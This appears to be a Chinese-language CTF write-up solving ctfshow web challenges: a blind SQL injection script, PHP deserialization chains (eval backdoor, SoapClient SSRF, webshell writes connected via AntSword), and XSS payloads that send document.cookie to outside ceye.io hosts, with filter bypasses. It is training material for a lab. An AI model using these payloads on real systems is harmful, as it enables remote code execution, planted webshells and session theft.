    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }
```

不允许select or and flag into =

用like+正则 

tableName=`ctfshow_user`where`pass`like'%25c%25'，直接POST上去。

然后，使用盲注脚本：

```
import requests

url = 'http://59418fd8-bd5f-4fd3-bc04-9997ef8ac8e4.challenge.ctf.show/select-waf.php'

flagstr = '1234567890asdfghjklqwertyuiopzxcvbnm-_{}'
flag = 'ctfshow{'

for i in range(50):
    for x in flagstr:
        data = {
            'tableName': f"`ctfshow_user`where`pass`regexp'{flag + x}'"
        }
        res = requests.post(url=url, data=data)
        if res.text.find('user_count = 1;') > 0:
            flag += x
            print('++++++++++++++++++++++++right:   ' + x)
            break
        else:
            print('+++++++++++++++++wrong:  ' + x)
    print(flag)

```

运行即可发现flag的值会一点一点拼出来，直到括号闭合成功后即可停止脚本执行提交flag。



## 反序列化

### web254

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

这题纯纯试水用的，当username = xxxxxx & password = xxxxxx时，文件打开flag.php告诉你flag是多少。

payload：?username=xxxxxx&password=xxxxxx

![](.\反序列化\图片\web254.png)



### web255

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

又一次需要username和password的GET请求，然后对user的cookie进行反序列化，如果username 和password均为xxxxxx，同时

user的checkvip()通过(即user的isvip=true)，那就可以得到flag。

也就是说需要一个已经序列化好的user的cookie

先构造serialize.php：

```php
<?php
	class ctfShowUser{
    	public $isVip=true;
	}
	$a = new ctfShowUser();
	echo(urlencode(serialize($a)));

```

得到的值为O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D，这就是需要的cookie

使用BurpSuite重放

payload：?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

请注意，使用BurpSuite时Cookie传递记得在Connection上面。

得到flag

![](.\反序列化\图片\web255.png)



### web256

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}




```

多了一步对user的username和password的判断，要求不相等

构造序列化：

```
<?php
    class ctfShowUser
    {
        public $isVip = true;
        public $username='114514';
        public $password='1919810';
    }
    $user = new ctfShowUser();
    echo(urlencode(serialize($user)));
```

生成的序列化值为O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22114514%22%3Bs%3A8%3A%22password%22%3Bs%3A7%3A%221919810%22%3B%7D

payload:?username=114514&password=1919810

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22114514%22%3Bs%3A8%3A%22password%22%3Bs%3A7%3A%221919810%22%3B%7D

拿到flag

![](.\反序列化\图片\web256.png)



### web257

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}


```

首先读入username和password两个GET请求，然后还有一个叫user的cookie需要先序列化再输入。

注意__destruct()，它可以用来创建新的类，也就可以利用它来执行后门函数。

我们可以将class修改的值修改为一个backDoor对象，对backDoor类中的code属性进行赋值来达到rce

接下来进行判断：

首先user的username和password进入login()判断，这次只用存在即可

然后就没有然后了。

开始序列化：

```
<?php
    class ctfShowUser
    {
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
        $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    echo urlencode($a);
 
?>
```

序列化值为：O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

payload:?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

抓包执行后，已成功打开flag.php，查询源代码即可得到flag。

![](.\反序列化\图片\web257.png)



### web258

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 21:38:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}



```

本题需要执行后门函数值得注意的是user序列化的值这次又正则过滤了，过滤内容为“O:”的集合。

绕过方法为在前面加上“+”号。

开始进行序列化：

```
<?php
    class ctfShowUser
    {
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
            $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
        public function getInfo()
        {
            eval($this->code);
        }
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    $a = str_replace('O:','O:+',$a);
    echo urlencode($a);
 
?>

```

得到的序列化值为:

O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

payload：?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

执行完毕后在原网站查看源码即可得到flag。

![](.\反序列化\图片\web258.png)



### web259(本地环境问题，根据视频讲解完成)

> 知识点
> 1.某个实例化的类，如果调用了一个不存在的函数会去调用__call魔术方法__call会发送一个请求
> 2.CRLF \r\n
> 3.POST数据提交最常用类型Content-Type:
> application/x-www-form-urlencoded。

题目限定:php7，关于更新版本的区别见下面

这次题目先给我们一个flag.php的源码:

```php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

说明需要修改请求头的HTTP_X_FORWARDED_FOR为127.0.0.1，然后在接收一个token=ctfshow的POST请求才会打开flag.txt得到flag

先看一下靶机里面还有什么：

```
<?php

highlight_file(__FILE__);


$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

说明先对vip的GET请求反序列化，然后将值传入getFlag()，问题是题目没告诉我们getFlag()是什么。

因此这题得使用php原生类进行反序列化攻击，考察函数为__call()，如何使用呢？**当调用不存在的时候，默认采用SoapClient的模式。**

SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一
种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果
去调用了一个不存在的函数，会去调用 __call 方法

```
<?php
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1:9999"));
$client->getFlag();  //调用不存在的方法，会自动调用——call()函数来发送请求
?>

```

*SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用 __call 方法。下面我们一步步解释原理。*

由于是底层通讯协议，所以就不要拿这个代码去生成序列化了，将它传给服务器。

php：

```
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
$a = serialize($b);
$a = str_replace('^^',"\r\n",$a);
echo urlencode($a);
?>
```

生成的序列化值为：

php7:

```
O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22ssrf%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A123%3A%22%0D%0AX-Forwarded-For%3A127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```



```
O%3A10%3A%22SoapClient%22%3A36%3A%7Bs%3A15%3A%22%00SoapClient%00uri%22%3Bs%3A3%3A%22aaa%22%3Bs%3A17%3A%22%00SoapClient%00style%22%3BN%3Bs%3A15%3A%22%00SoapClient%00use%22%3BN%3Bs%3A20%3A%22%00SoapClient%00location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A17%3A%22%00SoapClient%00trace%22%3Bb%3A0%3Bs%3A23%3A%22%00SoapClient%00compression%22%3BN%3Bs%3A15%3A%22%00SoapClient%00sdl%22%3BN%3Bs%3A19%3A%22%00SoapClient%00typemap%22%3BN%3Bs%3A22%3A%22%00SoapClient%00httpsocket%22%3BN%3Bs%3A19%3A%22%00SoapClient%00httpurl%22%3BN%3Bs%3A18%3A%22%00SoapClient%00_login%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_use_digest%22%3Bb%3A0%3Bs%3A19%3A%22%00SoapClient%00_digest%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_host%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_port%22%3BN%3Bs%3A24%3A%22%00SoapClient%00_proxy_login%22%3BN%3Bs%3A27%3A%22%00SoapClient%00_proxy_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_exceptions%22%3Bb%3A1%3Bs%3A21%3A%22%00SoapClient%00_encoding%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_classmap%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_features%22%3BN%3Bs%3A31%3A%22%00SoapClient%00_connection_timeout%22%3Bi%3A0%3Bs%3A27%3A%22%00SoapClient%00_stream_context%22%3Bi%3A0%3Bs%3A23%3A%22%00SoapClient%00_user_agent%22%3Bs%3A129%3A%22aaaaaa%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A23%3A%22%00SoapClient%00_keep_alive%22%3Bb%3A1%3Bs%3A23%3A%22%00SoapClient%00_ssl_method%22%3BN%3Bs%3A25%3A%22%00SoapClient%00_soap_version%22%3Bi%3A1%3Bs%3A22%3A%22%00SoapClient%00_use_proxy%22%3BN%3Bs%3A20%3A%22%00SoapClient%00_cookies%22%3Ba%3A0%3A%7B%7Ds%3A29%3A%22%00SoapClient%00__default_headers%22%3BN%3Bs%3A24%3A%22%00SoapClient%00__soap_fault%22%3BN%3Bs%3A26%3A%22%00SoapClient%00__last_request%22%3BN%3Bs%3A27%3A%22%00SoapClient%00__last_response%22%3BN%3Bs%3A34%3A%22%00SoapClient%00__last_request_headers%22%3BN%3Bs%3A35%3A%22%00SoapClient%00__last_response_headers%22%3BN%3B%7D
```

将这个值作为vip的GET请求输入，根据flag.php的功能到目录下方查看flag.txt即可得到flag。

**记得运行前打开SoapCient原生类，默认是关闭的……**

然后如果要用这个，php版本不应该为8



### web260

```
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}

```

是这样的，首先包含了flag.php，如果ctfshow的GET请求序列化后有“ctfshow_i_love_36D”字样就给你flag。

可序列化又不更改对象名称，所以直接输入即可，这题纯吓唬人。

payload:?ctfshow=ctfshow_i_love_36D



### web261

```
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']);
```

魔术方法的反序列化，一眼顶真。

看得出来我们应该执行__invoke()

在php7.4.0开始，如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 我们不需要考虑__wakeup,__invoke是类被进行函数调用时启用，也无法利用到，所以直接看看能不能写入文件。

0x36d十进制就等于877,因为是弱类型比较，像877a等都可以通过，所以我们用username='877.php',password='一句话木马'，不用在意那个wakeup

```
<?php
    class ctfshowvip
    {
        public $username;
        public $password;

        public function __construct($u, $p)
        {
            $this->username = $u;
            $this->password = $p;
        }
    }

    $a = new ctfshowvip('877.php', '<?=eval($_POST[1]);?>');
    echo urlencode(serialize($a));
?>
```

如此一来，当a被输入后，$code就会将username和password拼接起来再传给__destruct()中然后让它输出。这样我们就把木马成功写入877.php文件，之后用AntSword连接即可。

得到的序列化值为：

O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A21%3A%22%3C%3F%3Deval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D

用vip作为GET输入后，挂上木马，不过没有回显，无所谓了。访问877.php即可得到webshell，然后拿到flag。

flag在/flag_is_here中，害得我一顿好找。

![](.\反序列化\图片\261.png)

### web262

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);


```

**注释里告诉我们message.php,要求我们的token为admin**

**该题运用反序列化字符串逃逸，运用的思想跟sql注入的闭合相似**

**我们这里有一个序列化字符串，我们要改变token属性，但我们无法直接控制它的值。**

**我们只能给from，msg，to传递值，即这三个属性是可控的**

```
O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:1:"3";s:5:"token";s:4:"user";}
```

**假如我们向to属性传递 t=3";s:5:"token";s:5:"admin";} 字符串就变为了下面这样**

```
O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:27:"3";s:5:"token";s:4:"user";}";s:5:"token";s:5:"admin";}
```

**我们对字符串进来了闭合，这样我们就可以控制token属性的值了，但我们也会发现一点，to属性值的长度变为了27。**

**反序列化时，如果为27则会匹配后面27个字符，这样闭合就没有效果。**

**这时候题目中的替换字符函数可以帮助到我们**

```
$umsg = str_replace('fuck', 'loveU', serialize($msg));
```

**str_replace会将fuck替换为loveU，且替换是在序列化之后进行的，也就是说，实际字符串长度增加了1，但标明的字符串长度任然为原值**

```
// 替换前
s:2:"to";s:4:"fuck";
// 替换后
s:2:"to";s:4:"loveU";
```

**通过这种方法，我们就可以凭空增加字符，来成功进行闭合**

```
// t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
// 后面多出27个字符，所以我们写27个fuck，替换为loveU后，增加了27个字符，来达到字符串逃逸
```

**最终我们的payload为**

```
f=1&m=2&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

这题十分的像pwn51，用魔法打败魔法。

然后访问message.php即可得到flag



### web263

按下F12后发现Script脚本

```
		function check(){
			$.ajax({
			url:'check.php',
			type: 'GET',
			data:{
				'u':$('#u').val(),
				'pass':$('#pass').val()
			},
			success:function(data){
				alert(JSON.parse(data).msg);
			},
			error:function(data){
				alert(JSON.parse(data).msg);
			}

		});
		}	
```

本题考查session反序列化漏洞，扫描目录可得www.zip，下载得到源代码

```
<?php

	error_reporting(0);
	session_start();
	//超过5次禁止登陆
	if(isset($_SESSION['limit'])){
		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
	}else{
		 setcookie("limit",base64_encode('1'));
		 $_SESSION['limit']= 1;
	}
	
?>

```

代码审计后主要有几个关键区域。

在index.php 我们发现$_SESSION['limit']我们可以进行控制

```
//超过5次禁止登陆
if(isset($_SESSION['limit'])){
  $_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
  $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
}else{
   setcookie("limit",base64_encode('1'));
   $_SESSION['limit']= 1;
}
```

flag在flag.php处，目测需要rce

```
$flag="flag_here";
```

inc.php 设置了session的序列化引擎为php，很有可能说明默认使用的是php_serialize

```
ini_set('session.serialize_handler', 'php');
```

并且inc.php中有一个User类的__destruct含有file_put_contents函数，并且username和password可控，可以进行文件包含geshell

```
   function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
```

开始构造EXP，生成payload

```
<?php
  class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
  }

  $a = new User('1.php', '<?php eval($_POST[1]);phpinfo()?>');
  $a->setStatus('成功');
  echo ('|'.serialize($a));
?>

```

payload:

```
|O:4:"User":3:{s:8:"username";s:5:"1.php";s:8:"password";s:24:"";s:6:"status";s:6:"成功";}
```

在开发者工具的控制台替换cookie

```
document.cookie='limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ=='
```

访问check.php改写$_SESSION['limit'],将shell写入log-1.php

最后蚁剑访问log-1.php

```
POST 1=system("tac flag.php")
```

![](.\反序列化\图片\web263.png)

![](.\反序列化\图片\web263-蚁剑.png)



## XSS

> document.cookie							用于js获取当前网页的cookie值
> window.location.href					 用于获取当前页面地址链接
> window.location.href='www.baidu.com'	  用于相当于跳转地址
>
> 服务器准备的接收文件：xss.php
> <?php
> $cookie=$_GET['cookie'];
> $myfile=fopen('cookie.txt','w+');
> fwirte($myfile,$cookie);
> fclose($myfile);
> ?>
>
> http://[ip]/xss.php?cookie=document.cookie		用于给服务器发送当前界面的coolie
> window.location.href='http://[ip]/xss.php?cookie='+document.cookie	用于指向服务器ip并把当前界面的cookie值作为get参数发送过去
>
> 最后的js语句payload：
> <script>window.location.href='http://[ip]/xss.php?cookie='+document.cookie</script>

### web316

去**控制台**输入以下指令：alert(document.cookie)

得到的信息为：

```
PHPSESSID=ptnd4qql435ille8hetr5bkij4; flag=you%20are%20not%20admin%20no%20flag
```

在ceye网站上注册临时域名，用它来反射出cookie。

payload：

```
<script> var img=document.createElement("img"); img.src="http://hi8y3b.ceye.io/"+document.cookie; </script>
```

在后台里面得到flag

![](.\XSS\图片\web316.png)

经历了30多分钟，不容易啊。

对payload的解释：

```
var img=document.createElement("img");  //这个是生成一个img对象
img.src="http://hi8y3b.ceye.io/"+document.cookie; 
/*是加载一张图片加上当前的cookie这里我们填写的是接收平台的地址，所以带上document.cookie去加载地址然后平台会有记录cookie的值，ctf平台会有个虚拟机器人，充当admin身份，每隔一段时间点开网站它一点开就会加载payload，发送它自身的cookie在那个框内输入那个标签输进去，网站一加载就执行了我们输入的xss代码然后他自己会发送cookie*/
```



### web317

用上一次的payload试了一下，不行。

因为带有过滤了

思路：用body语句生成可绕过过滤的payload：

```
<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
```

此时会因为window.open()的作用弹出新的窗口，上面写着

```
{"meta": {"code": 201, "message": "HTTP Record Insert Success"}}
```

说明消息发送成功，那XSS应该也反弹生效了，回ceye查看后台可获得flag

![](.\XSS\图片\web317.png)



### web318

过滤条件增加了

```
<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
```

这个payload依旧管用，先用着。

![](.\XSS\图片\web318.png)



### web319

过滤条件又增加了

```
<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
```

但这个payload依旧坚挺。

![](.\XSS\图片\web319.png)





### web320

不知道过滤了什么，一个个试。

```
document.cookie">
+document.cookie">
xss='+document.cookie">
='http://[ip]/xss.php?xss='+document.cookie">
="document.location.href='http://[ip]/xss.php?xss='+document.cookie">
onload="document.location.href='http://[ip]/xss.php?xss='+document.cookie">
```

以上这些都是能够正常上传的，但再加上前面的一个空格就不行了，从而可知过滤的是空格

替换方法还是有的：`tab、/**/`

payload:

```
<body/**/onload="window.open('http://we1wmh.ceye.io/'+document.cookie)"></body>
```

结果：

```
{"meta": {"code": 201, "message": "HTTP Record Insert Success"}}
```

![](.\XSS\图片\web320.png)



### web321-326

```
<body/**/onload="window.open('http://we1wmh.ceye.io/'+document.cookie)"></body>
```

过滤了XSS，但我没有用过。

![](.\XSS\图片\web321.png)



### 

### web327(VPS)

现在开始，学习存储型XSS

> 嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库（日志等也可），等用户打开页面时，会继续执行恶意代码，能够持续的攻击用户。
>
> 如何操作存储型XSS： 嵌入到web页面的恶意代码被存储到服务器上，例如在注册时候将用户昵称设置为XSS恶意代码，那么访问某些页面会显示用户名的时候就会触发恶意代码。
>
> JS属于前端代码，如果植入恶意代码成功，JS代码是不会显示出来的。
>
> 存储型XSS与反射型XSS的区别： 存储型存入数据库中，可持续时间长，而反射型持续时间短，仅对本次访问有影响，反射型一般要配合社工。
>
> 存储型XSS可以通过弹窗验证，不过不建议，会破坏网站结构，引起管理员的主意。
>
> 存储型XSS可能出现的位置：
> （1）用户注册
> （2）留言板
> （3）上传文件的文件名处
> （4）管理员可见的报错信息
> （5）在线聊天框
> （6）客服
> （7）问题反馈区
> （8）邮件信箱
> 理论上，见框就插。

```
<body/**/onload="document.location.herf='http://we1wmh.ceye.io/'+document.cookie"></body>
```

